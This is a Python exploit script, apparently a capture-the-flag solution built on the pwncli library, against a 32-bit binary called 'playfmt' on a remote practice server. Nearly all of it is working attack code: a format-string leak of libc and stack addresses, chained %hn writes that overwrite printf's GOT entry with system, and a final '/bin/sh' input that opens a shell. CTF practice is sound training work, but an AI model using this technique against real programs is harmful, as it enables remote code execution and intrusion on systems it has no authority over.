#!/usr/bin/env python3
# Date: 2024-11-08 08:21:12
# Link: https://github.com/RoderickChan/pwncli

from pwncli import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './playfmt'
context.log_level = 'debug'
context.timeout = 10

# gift.io = process('./playfmt')
gift.io = remote('node5.buuoj.cn', 27020)
gift.elf = ELF('./playfmt')
gift.libc = ELF('/lib32/libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

def cmd(i, prompt):
    sla(prompt, i)

def add():
    cmd('1')
    #......

def edit():
    cmd('2')
    #......

def show():
    cmd('3')
    #......

def dele():
    cmd('4')
    #......

ru(b'=====================\n')
ru(b'=====================\n')
s(b'%15$p,%6$p')
libc_base = int(r(10), 16) - libc.sym['__libc_start_main'] - 247
success('libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
ru(b',')
rbp = int(r(10), 16) - 0x10
success('rbp -> {}'.format(hex(rbp)))

printf_got = elf.got['printf']

payload = ('%' + str((rbp - 0x4) & 0xffff) + 'c%6$hnqwq1').encode()
s(payload)
ru(b'qwq1')

payload = ('%' + str(printf_got & 0xffff) + 'c%10$hnqwq2').encode()
s(payload)
ru(b'qwq2')

payload = ('%' + str((rbp + 0x4) & 0xffff) + 'c%6$hnqwq3').encode()
s(payload)
ru(b'qwq3')
payload = ('%' + str((printf_got + 2) & 0xffff) + 'c%10$hnqwq4').encode()
s(payload)
ru(b'qwq4')

ary = [system & 0xffff, (system >> 16)]
oary = ary.copy()
oary = [oary[0], 0, oary[1]]
ary.sort()

payload = '%' + str(ary[0]) + 'c%' + str(oary.index(ary[0]) + 5) + '$hn%' 
payload += str(ary[1] - ary[0]) + 'c%' + str(oary.index(ary[1]) + 5) + '$hnqwq'
print(payload)

payload = ('%' + str((system >> 16) & 0xff) + 'c' + '%7$hhn')
payload += ('%' + str((system & 0xffff) - ((system>>16)&0xff)) + 'c' + '%5$hnqwq')
print(payload)

s(payload.encode())
ru(b'qwq')

s(b'/bin/sh\x00')


# sl(b'/bin/sh\x00')
ia()
